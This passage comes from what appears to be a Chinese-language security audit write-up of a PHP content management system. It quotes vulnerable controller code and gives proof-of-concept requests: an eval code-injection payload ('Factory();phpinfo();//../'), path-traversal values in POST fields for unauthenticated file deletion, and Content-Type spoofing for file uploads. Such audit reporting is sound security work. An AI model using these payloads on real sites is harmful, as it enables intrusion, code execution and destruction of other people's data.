+</span></span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$_a</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;nav&#39;</span><span class="p">,</span> <span class="s1">&#39;article&#39;</span><span class="p">,</span><span class="s1">&#39;backup&#39;</span><span class="p">,</span><span class="s1">&#39;html&#39;</span><span class="p">,</span><span class="s1">&#39;link&#39;</span><span class="p">,</span><span class="s1">&#39;pic&#39;</span><span class="p">,</span><span class="s1">&#39;search&#39;</span><span class="p">,</span><span class="s1">&#39;system&#39;</span><span class="p">,</span><span class="s1">&#39;xml&#39;</span><span class="p">,</span><span class="s1">&#39;online&#39;</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location:&#39;</span><span class="o">.</span><span class="s1">&#39;?a=login&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>  
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;/controller/&#39;</span><span class="o">.</span><span class="nx">ucfirst</span><span class="p">(</span><span class="nv">$_a</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;Action.class.php&#39;</span><span class="p">))</span> <span class="nv">$_a</span> <span class="o">=</span> <span class="s1">&#39;Login&#39;</span><span class="p">;</span><span class="c1">//ucfirst(), 将字符串首字母转化为大写，file_exists() 函数检查文件是否存在，如果文件不存在就回退为 Login 控制器
+</span></span></span><span class="line"><span class="cl">		<span class="k">eval</span><span class="p">(</span><span class="s1">&#39;self::$_obj = new &#39;</span><span class="o">.</span><span class="nx">ucfirst</span><span class="p">(</span><span class="nv">$_a</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;Action();&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nx">self</span><span class="o">::</span><span class="nv">$_obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span></code></pre></div><p>1、绕过 file_exists（）</p>
+<p>这个函数在进行检查时，比如/controller/admin;/../，函数允许路径中有一些特殊字符，并且遇到/../会返回到上级目录，可以利用这个绕过 file_exists（）函数检查。</p>
+<p>那么我们构造poc:<code>Factory();phpinfo();//../</code></p>
+<p>2、入口点</p>
+<p>调用Factory() 的入口点在 Factory::setAction()-&gt;run(); 这里，在admin/index.php 这个文件中得知，它包含了/config/run.inc.php，可以利用</p>
+<p>3、POC</p>
+<p><code>/admin?a=Factory();phpinfo();//../</code></p>
+<p><img alt="20250710234248614" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png"></p>
+<h3 id="任意文件删除">任意文件删除<a hidden class="anchor" aria-hidden="true" href="#任意文件删除">#</a></h3>
+<p>根据审计PicAction.class.php时遇到的delall()函数，无验证造成的任意文件删除漏洞，进行复现。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">delall</span><span class="p">(){</span><span class="c1">//删除图片，依旧没有验证用户
+</span></span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;send&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nx">validate</span><span class="o">::</span><span class="na">isNullString</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pid&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;没有选择任何图片!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=pic&#39;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span><span class="c1">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#39;?a=pic&#39;
+</span></span></span><span class="line"><span class="cl">			<span class="nv">$_fileDir</span><span class="o">=</span><span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;/uploads/&#39;</span><span class="p">;</span><span class="c1">//上传目录的跟路径
+</span></span></span><span class="line"><span class="cl">			<span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pid&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$_value</span><span class="p">){</span><span class="c1">//遍历提交的图片名
+</span></span></span><span class="line"><span class="cl">				<span class="nv">$_filePath</span><span class="o">=</span><span class="nv">$_fileDir</span><span class="o">.</span><span class="nv">$_value</span><span class="p">;</span><span class="c1">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞
+</span></span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">unlink</span><span class="p">(</span><span class="nv">$_filePath</span><span class="p">)){</span><span class="c1">//unlink() 删除文件
+</span></span></span><span class="line"><span class="cl">					<span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;图片删除失败,请设权限为777!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=pic&#39;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location:?a=pic&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">					
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>来到对应的功能点：</p>
+<p><img alt="20250712193547260" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png"></p>
+<p>先给 upload 随便上传一张图片</p>
+<p><img alt="20250712193717272" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png"></p>
+<p><img alt="20250712193754284" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png"></p>
+<p>删除，进行抓包：</p>
+<p><img alt="20250712193827895" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png"></p>
+<p><img alt="20250712193843074" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png"></p>
+<p>URL编码：<code>pid%5B0%5D=1.png&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p>
+<p>解码：</p>
+<p><code>pid[0]=1.png&amp;chkall=on&amp;send=删除选中图片</code></p>
+<p><code>chkall=on</code>是一个复选框</p>
+<p><img alt="20250712194432977" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png"></p>
+<p>可以看到只要在pid后的文件名进行路径拼接就可以跳到任意目录去删除文件</p>
+<p>接下来就可以根据上面的数据构造POC：</p>
+<p><code>pid[0]=/../1.txt&amp;chkall=on&amp;send=删除选中图片</code></p>
+<p><code>pid%5B0%5D=/../1.txt&amp;chkall=on&amp;send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87</code></p>
+<p>路由：admin/?a=pic&amp;m=delall</p>
+<p>在根目录准备一个1.txt</p>
+<p><img alt="20250712194601104" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png"></p>
+<p>退出登录</p>
+<p><img alt="20250712194749344" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png"></p>
+<p>POST传参：</p>
+<p><img alt="20250712195154540" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png"></p>
+<p>上图的浏览器删不掉，换了一个成功了</p>
+<p><img alt="20250712195540507" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png"></p>
+<p><img alt="20250712195612613" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png"></p>
+<h3 id="任意文章文件no删除">任意文章/文件（no）删除<a hidden class="anchor" aria-hidden="true" href="#任意文章文件no删除">#</a></h3>
+<p>这里想到审计ArticleAction.class.php时也有delall()函数，看看这里有没有文章删除漏洞。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//删除单个文章
+</span></span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">delete</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_findOne</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">findOne</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$html</span><span class="o">=</span><span class="nv">$_findOne</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">html</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nv">$html</span><span class="o">==</span><span class="k">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;0.html&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">//先删除静态文件
+</span></span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nx">tool</span><span class="o">::</span><span class="na">delete_file</span><span class="p">(</span><span class="nv">$html</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">delete_article</span><span class="p">()){</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">Tool</span><span class="o">::</span><span class="na">alertLocation</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="nx">tool</span><span class="o">::</span><span class="na">getPrevPage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;删除失败!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=article&amp;m=index&#39;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//删除多个文章
+</span></span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">delall</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;send&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span><span class="p">(</span><span class="nx">validate</span><span class="o">::</span><span class="na">isNullString</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;showid&#39;</span><span class="p">]))</span> <span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;没有选择任何内容!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=article&amp;m=index&#39;</span><span class="p">,</span><span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">//$this-&gt;_model-&gt;id=implode(&#39;,&#39;,$_POST[&#39;showid&#39;]);
+</span></span></span><span class="line"><span class="cl">			<span class="c1">//echo $this-&gt;_model-&gt;id;
+</span></span></span><span class="line"><span class="cl">			<span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;showid&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$_value</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">=</span><span class="nv">$_value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$_findOne</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">findOne</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$html</span><span class="o">=</span><span class="nv">$_findOne</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">html</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nv">$html</span><span class="o">==</span><span class="k">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$html</span><span class="o">=</span><span class="s1">&#39;0.html&#39;</span><span class="p">;</span>		
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="c1">//先删除静态文件
+</span></span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$html</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">				<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">unlink</span><span class="p">(</span><span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$html</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">					<span class="nx">tool</span><span class="o">::</span><span class="na">layer_alert</span><span class="p">(</span><span class="s1">&#39;静态文件删除失败,请设权限为777!&#39;</span><span class="p">,</span><span class="s1">&#39;?a=article&amp;m=index&#39;</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="p">}</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">delete_article</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">				<span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Location:&#39;</span><span class="o">.</span><span class="nx">tool</span><span class="o">::</span><span class="na">getPrevPage</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><h4 id="delete">delete()<a hidden class="anchor" aria-hidden="true" href="#delete">#</a></h4>
+<p>GET传参，</p>
+<p>找到一篇文章的id</p>
+<p><img alt="20250712200511140" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png"></p>
+<p>构造POC：<code>admin/?a=article&amp;m=delete&amp;id=2450</code></p>
+<p><img alt="20250712200604332" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png"></p>
+<p>执行后发现这篇文章被删除了</p>
+<p><img alt="20250712200619491" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png"></p>
+<h4 id="delall">delall()<a hidden class="anchor" aria-hidden="true" href="#delall">#</a></h4>
+<p>功能点：此处多选删除</p>
+<p><img alt="20250712201015073" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png"></p>
+<p>抓包：</p>
+<p><img alt="20250712201031989" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png"></p>
+<p><code>showid%5B%5D=2449&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p>
+<p>同样的，构造POC：</p>
+<p><code>showid%5B%5D=%2F..%2F1.txt&amp;showid%5B%5D=2448&amp;showid%5B%5D=2447&amp;showid%5B%5D=2446&amp;chkall=on&amp;send=%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4</code></p>
+<p>路由：admin/?a=article&amp;m=delall</p>
+<p><img alt="20250712201614722" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png"></p>
+<p>但是只删除了文章并没有删除1.txt ？？</p>
+<p>再认真分析一遍：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;showid&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$_value</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">id</span><span class="o">=</span><span class="nv">$_value</span><span class="p">;</span><span class="c1">//获取文章id
+</span></span></span><span class="line"><span class="cl">				<span class="nv">$_findOne</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_model</span><span class="o">-&gt;</span><span class="na">findOne</span><span class="p">();</span><span class="c1">//数据库查询
+</span></span></span><span class="line"><span class="cl">				<span class="nv">$html</span><span class="o">=</span><span class="nv">$_findOne</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">html</span><span class="p">;</span><span class="c1">//从数据库中获取 HTML
+</span></span></span></code></pre></div><p>直接传递<code>/../1.txt</code>作为ID值，系统会将<code>/../1.txt</code>当作文章ID去数据库查询，显然这个ID不存在</p>
+<p>想要利用这里的漏洞，只能去更改数据库中HTML的内容，</p>
+<p>添加、修改、删除都进行了用户验证，所以这个也不算一个漏洞了。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_tpl</span><span class="o">-&gt;</span><span class="na">assign</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$html</span><span class="o">=</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;html_temp&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;html_temp&#39;</span><span class="p">]</span><span class="o">=</span><span class="nv">$_art</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">html</span><span class="p">;</span>
+</span></span></code></pre></div><h3 id="任意文件上传">任意文件上传<a hidden class="anchor" aria-hidden="true" href="#任意文件上传">#</a></h3>
+<p>controller/CallAction.class.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-PHP" data-lang="PHP"><span class="line"><span class="cl"><span class="c1">//处理上传图片
+</span></span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">upLoad</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;send&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_logoupload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">LogoUpload</span><span class="p">(</span><span class="s1">&#39;pic&#39;</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;MAX_FILE_SIZE&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_path</span> <span class="o">=</span> <span class="nv">$_logoupload</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">(</span><span class="nv">$_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_img</span><span class="o">-&gt;</span><span class="na">xhImg</span><span class="p">(</span><span class="mi">960</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_img</span><span class="o">-&gt;</span><span class="na">out</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="c1">//echo $_path;
+</span></span></span><span class="line"><span class="cl">			<span class="nv">$_logoupload</span><span class="o">-&gt;</span><span class="na">alertOpenerClose</span><span class="p">(</span><span class="s1">&#39;图片上传成功！&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="o">.</span><span class="nv">$_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">exit</span><span class="p">(</span><span class="s1">&#39;警告：文件过大或者其他未知错误导致浏览器崩溃！&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//构造方法，初始化
+</span></span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$_file</span><span class="p">,</span><span class="nv">$_maxsize</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">error</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$_file</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">maxsize</span> <span class="o">=</span> <span class="nv">$_maxsize</span> <span class="o">/</span> <span class="mi">1024</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">type</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$_file</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">path</span> <span class="o">=</span> <span class="nx">ROOT_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">UPLOGO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$_file</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="nv">$_file</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkError</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkType</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">checkPath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">moveUpload</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span></code></pre></div><p>根据Content-Type的值来判断是否是图片格式，只要Content-Type是这两种类型就可以，那直接伪造Content-Type就可以了</p>
+<h3 id="任意文件上传-2">任意文件上传-2<a hidden class="anchor" aria-hidden="true" href="#任意文件上传-2">#</a></h3>
+<p>controller/CallAction.class.php</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">//xheditor编辑器专用上传
+</span></span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">xhUp</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_fileupload</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileUpload</span><span class="p">(</span><span class="s1">&#39;filedata&#39;</span><span class="p">,</span><span class="mi">10</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_err</span><span class="o">=</span><span class="nv">$_fileupload</span><span class="o">-&gt;</span><span class="na">checkError</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_path</span> <span class="o">=</span> <span class="nv">$_fileupload</span><span class="o">-&gt;</span><span class="na">getPath</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_msg</span><span class="o">=</span><span class="s2">&#34;&#39;..</span><span class="si">$_path</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_img</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">(</span><span class="nv">$_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_img</span><span class="o">-&gt;</span><span class="na">xhImg</span><span class="p">(</span><span class="mi">650</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$_img</span><span class="o">-&gt;</span><span class="na">out</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">			<span class="k">echo</span> <span class="s2">&#34;{&#39;err&#39;:&#39;&#34;</span><span class="o">.</span><span class="nv">$_err</span><span class="o">.</span><span class="s2">&#34;&#39;,&#39;msg&#39;:&#34;</span><span class="o">.</span><span class="nv">$_msg</span><span class="o">.</span><span class="s2">&#34;}&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">exit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">Tool</span><span class="o">::</span><span class="na">alertBack</span><span class="p">(</span><span class="s1">&#39;警告：由于非法操作导致上传失败！&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span></code></pre></div><p>代码中的文件名以时间+100到1000之间的随机数进行重命名</p>
+<p>同样也是检查的传入的Content-Type的值</p>
+<h3 id="未授权更改管理员账号密码"><strong>未授权更改管理员账号密码</strong><a hidden class="anchor" aria-hidden="true" href="#未授权更改管理员账号密码">#</a></h3>
+<p>首先来看一下漏洞利用过程，在未登录的情况下构造url,只需要更改username password notpassword的值即可更改数据库中admin账号的相关信息</p>
+<p>根据url来定位一下漏洞函数，函数位于controller\AdminAction.class.php中的update函数</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">update</span><span class="p">(){</span>
